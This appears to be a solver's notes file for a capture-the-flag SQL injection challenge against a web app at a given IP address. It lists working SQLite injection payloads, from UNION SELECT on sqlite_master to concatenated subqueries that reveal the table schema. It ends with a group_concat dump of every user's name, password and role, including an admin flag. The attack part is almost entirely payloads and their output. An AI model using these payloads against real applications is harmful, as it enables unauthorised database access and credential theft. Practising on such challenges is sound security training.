
"""
This challenge is testing for sql injection
Ryan : flag245698 =>admin,
"""

url="http://3.126.138.80/shareideas/"


# ' or select 1 and "x"='x
# 1' ORDER BY 1--+

# TEMPLATE
# insert into users(item,item,item,item) values('value1','value2','value3',' PAYLOADHERE	') 


"""

admin') union select 1,tbl_name,3 from sqlite_master -- ##


' || (select sqlite_version() )) -- ##
' || (select tbl_name from sqlite_master )) -- ##
	 xde43_users


' || (select (sql) from sqlite_master )) -- ##   == 

	CREATE TABLE "xde43_users" ( "id" int(10) NOT NULL, "name" varchar(255) NOT NULL, "email" varchar(255) NOT NULL, "password" varchar(255) NOT NULL, "role" varchar(100) DEFAULT NULL )

' || (select group_concat("<br>"|| name || " : " || password || " =>" || role) from xde43_users)) -- ##


Maria : 19609892341616789412 =>user,
Trevor : 15798463971616789412 =>user,
Jacob : 13901897451616789412 =>user,
Paul : 4066292821616789412 =>user,
Alex : 19845351601616789412 =>user,
Mira : 1424205211616789412 =>user,
Michael : 17035199601616789412 =>user,
Joshua : 3626686961616789412 =>user,
Matthew : 10956116571616789412 =>user,
Ethan : 14015465241616789412 =>user,
Andrew : 7750792971616789412 =>user,
Daniel : 8452056431616789412 =>user,
Anthony : 15930147091616789412 =>user,
William : 1073495091616789412 =>user,
Ryan : flag245698 =>admin,
Shila : 19728563381616789412 =>user,
David : 20026623331616789412 =>user,
Jonathan : 11345710461616789412 =>user,
Christina : 11849797961616789412 =>user,
Gabriel : 408741651616789412 =>user


"""
